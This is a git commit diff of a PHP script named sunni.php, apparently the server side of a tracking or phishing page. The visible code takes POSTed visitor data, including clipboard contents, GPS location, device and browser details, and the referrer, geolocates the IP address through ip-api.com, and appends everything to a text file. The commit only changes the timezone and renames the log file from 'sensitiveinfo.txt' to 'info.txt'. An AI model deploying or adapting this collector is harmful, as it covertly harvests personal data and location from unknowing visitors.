49d27d89990520a83a5bd5387ecd2df18bceb894
Jhon Stark <131217436+cool4388@users.noreply.github.com>
2024-08-05 01:30:41 +0500

    sunni.php

--- sunni.php
+++ sunni.php
@@ -18,9 +18,9 @@ $clipboard = $_POST['clipboard'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $ulke = $details->country;
-date_default_timezone_set('Europe/Istanbul');
+date_default_timezone_set('Asia/Karachi');
 $tarih=date("d-m-Y H:i:s");
-$file = fopen('sensitiveinfo.txt', 'a');
+$file = fopen('info.txt', 'a');
 fwrite($file, "Ip Address: " .$ip."\n\n".
 "Country: ".$ulke ."\n\n"."NetworkInformation: ".$networkinfo."\n\n"."Batterypercentage: ".$batterypercentage."\n\n"."Ischarging: ".$ischarging."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."Clipboard: ".$clipboard."\n\n"."ReferUrl: ".$referurl."\n\n\n\n");
 fclose($file);
